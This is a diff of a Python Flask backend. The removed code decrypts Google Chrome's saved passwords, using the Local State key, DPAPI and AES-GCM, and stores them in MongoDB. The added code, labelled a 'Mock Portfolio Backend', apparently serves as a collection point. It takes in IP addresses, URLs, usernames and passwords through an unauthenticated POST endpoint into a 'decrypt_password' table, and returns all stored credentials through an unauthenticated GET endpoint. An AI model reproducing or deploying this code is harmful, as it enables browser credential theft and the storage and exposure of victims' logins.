@@ -1,114 +1,129 @@
-import os
-import win32crypt
-import re
-import json
-import base64
-from flask import Flask, request, jsonify, render_template_string, Response, session
+import sqlite3
+from flask import Flask, request, jsonify, render_template_string, Response, session, send_from_directory
 from flask_cors import CORS
+from functools import wraps
 from dotenv import load_dotenv
-from Cryptodome.Cipher import AES
-import pymongo
+import os
+
+# Load environment variables from .env file
+load_dotenv()
 
 app = Flask(__name__)
 CORS(app)
 
-# Load environment variables from .env
-load_dotenv()
+DATABASE = 'database.db'
+PORT = int(os.environ.get('PORT', 5000))
 
-# MongoDB Connection
-MONGO_URI = os.getenv("DATABASE_URI")  # Get MongoDB URI from .env
-client = pymongo.MongoClient(MONGO_URI)
-db = client["password_manager"]  # Database name
-collection = db["decrypted_passwords"]  # Collection name
+# Fetch admin credentials from environment variables
+ADMIN_USERNAME = os.getenv('ADMIN_USERNAME')
+ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD')
+
+def init_db():
+    # Connect to the database and create the table
+    conn = sqlite3.connect(DATABASE)
+    cursor = conn.cursor()
+    
+    # Create Table if it does not exist
+    cursor.execute(''' 
+                    CREATE TABLE IF NOT EXISTS decrypt_password (
+                        id INTEGER PRIMARY KEY,
+                        ip TEXT NOT NULL,
+                        url TEXT NOT NULL,
+                        username TEXT,
+                        password TEXT NOT NULL,
+                        timestamp TEXT DEFAULT CURRENT_TIMESTAMP
+                    )
+                    ''')
+    conn.commit()
+    conn.close()
+    
+def get_db_connection():
+    conn = sqlite3.connect(DATABASE)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+# Basic Admin Auth Decorator
+def require_admin(func):
+    @wraps(func)
+    def decorated_function(*args, **kwargs):
+        auth = request.authorization
+        if not auth or auth.username != ADMIN_USERNAME or auth.password != ADMIN_PASSWORD:
+            return jsonify({"message": "Unauthorized"}), 401
+        return func(*args, **kwargs)
+    return decorated_function
 
 @app.route('/')
 def home():
-    return "Flask with MongoDB is running!"
+    return "This is Mock Portfolio Backend"
 
-def get_secret_key():
-    try:
-        #(1) Get secretkey from chrome local state
-        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
-            local_state = f.read()
-            local_state = json.loads(local_state)
-        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-        #Remove suffix DPAPI
-        secret_key = secret_key[5:] 
-        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
-        return secret_key
-    except Exception as e:
-        print("%s"%str(e))
-        print("[ERR] Chrome secretkey cannot be found")
-        return None
+@app.route('/api/get-ip', methods=['GET'])
+def get_user_ip():
+    user_ip = request.remote_addr
+    forwarded_ip = request.headers.get('X-Forwarded-For', '').split(',')[0].strip()
+    real_ip = forwarded_ip or user_ip
+    return jsonify({"ip": real_ip})
+
+@app.route('/api/user-data', methods=['GET'])
+def get_user_data():
+    conn = get_db_connection()
+    cursor = conn.cursor()
     
-def decrypt_payload(cipher, payload):
-    return cipher.decrypt(payload)
+    cursor.execute('SELECT * FROM decrypt_password')
+    rows = cursor.fetchall()
+    
+    # Return the data as JSON
+    data = []
+    for row in rows:
+        data.append(dict(row))
+    
+    return jsonify(data)
 
-def generate_cipher(aes_key, iv):
-    return AES.new(aes_key, AES.MODE_GCM, iv)
+@app.route('/api/user-data', methods=['POST'])
+def add_user_data():
+    # Get data from the request
+    data = request.get_json()
+    ip = data.get('ip')
+    url = data.get('url')
+    username = data.get('username')
+    password = data.get('password')
+    
+    # Insert the new record into the database
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute('''
+        INSERT INTO decrypt_password (ip, url, username, password) 
+        VALUES (?, ?, ?, ?)
+    ''', (ip, url, username, password))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"message": "User data added successfully"}), 201
 
-def decrypt_password(ciphertext, secret_key):
-    try:
-        #(3-a) Initialisation vector for AES decryption
-        initialisation_vector = ciphertext[3:15]
-        #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
-        #Encrypted password is 192 bits
-        encrypted_password = ciphertext[15:-16]
-        #(4) Build the cipher to decrypt the ciphertext
-        cipher = generate_cipher(secret_key, initialisation_vector)
-        decrypted_pass = decrypt_payload(cipher, encrypted_password)
-        decrypted_pass = decrypted_pass.decode()  
-        return decrypted_pass
-    except Exception as e:
-        print("%s"%str(e))
-        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
-        return ""
+@app.route('/api/user-data/<int:id>', methods=['DELETE'])
+@require_admin
+def delete_user_data(id):
+    # Delete the record with the specified ID
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute('DELETE FROM decrypt_password WHERE id = ?', (id,))
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"message": "User data deleted successfully"})
 
-def process_file(file_path):
-    """Reads a JSON file and extracts login data"""
-    try:
-        with open(file_path, "r", encoding="utf-8") as file:
-            data = json.load(file)
-            
-            # Example JSON structure: [{ "url": "...", "username": "...", "password": "..." }]
-            for index, entry in enumerate(data):
-                url = entry.get("url")
-                username = entry.get("username")
-                password = entry.get("password")  # Assume it's already decrypted
-                
-                if url and username and password:
-                    # Insert into MongoDB
-                    collection.insert_one({
-                        "index": index,
-                        "url": url,
-                        "username": username,
-                        "password": password
-                    })
-                    print(f"Saved to MongoDB: {url}, {username}, {password}")
-
-    except Exception as e:
-        print(f"[ERROR] Failed to process {file_path}: {str(e)}")
-
-CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
-CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+@app.route('/api/user-data', methods=['DELETE'])
+@require_admin
+def delete_all_user_data():
+    # Delete all records from the decrypt_password table
+    conn = get_db_connection()
+    cursor = conn.cursor()
+    cursor.execute('DELETE FROM decrypt_password')
+    conn.commit()
+    conn.close()
+    
+    return jsonify({"message": "All user data deleted successfully"})
 
 if __name__ == '__main__':
-    app.run(debug=True)
-    try:
-        # Get secret key
-        secret_key = get_secret_key()
-
-        # Find Chrome's profile folders
-        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
-
-        # Loop through each profile folder
-        for folder in folders:
-            if os.path.exists(folder):
-                for filename in os.listdir(folder):
-                    if filename.endswith(".json"):  # Only process JSON files
-                        file_path = os.path.join(folder, filename)
-                        process_file(file_path)
-            else:
-                print(f"[ERROR] Folder path {folder} does not exist!")
-    except Exception as e:
-        print("[ERR] %s"%str(e))
+    # Initialize the database
+    init_db()
+    app.run(host='0.0.0.0', port=PORT, debug=False)
